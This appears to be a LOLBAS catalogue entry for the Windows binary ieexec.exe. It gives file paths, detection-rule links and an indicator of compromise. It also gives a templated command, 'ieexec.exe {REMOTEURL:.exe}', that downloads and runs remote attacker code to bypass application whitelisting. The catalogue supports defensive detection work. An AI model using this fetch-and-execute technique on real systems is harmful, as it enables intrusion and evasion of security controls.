---
title: "Ieexec.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
fetched_at: 2026-09-20T17:10:23Z
license: unspecified
category: windows
---

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

## Paths
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe

## Resources
- [https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/](https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/)

## Acknowledgements
- Casey Smith ([@subtee](https://twitter.com/@subtee))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)
- IOC: Network connections originating from ieexec.exe may be suspicious

## Download

1. Downloads and executes executable from the remote server.

```
ieexec.exe {REMOTEURL:.exe}
```

   - Use case: Download and run attacker code from remote location

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

   - ATT&CK® technique: T1105

   - Tags: Execute: RemoteExecute: EXE (.NET)

2. Downloads and executes executable from the remote server.

```
ieexec.exe {REMOTEURL:.exe}
```

   - Use case: Download and run attacker code from remote location

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

   - ATT&CK® technique: T1218

   - Tags: Execute: RemoteExecute: EXE (.NET)
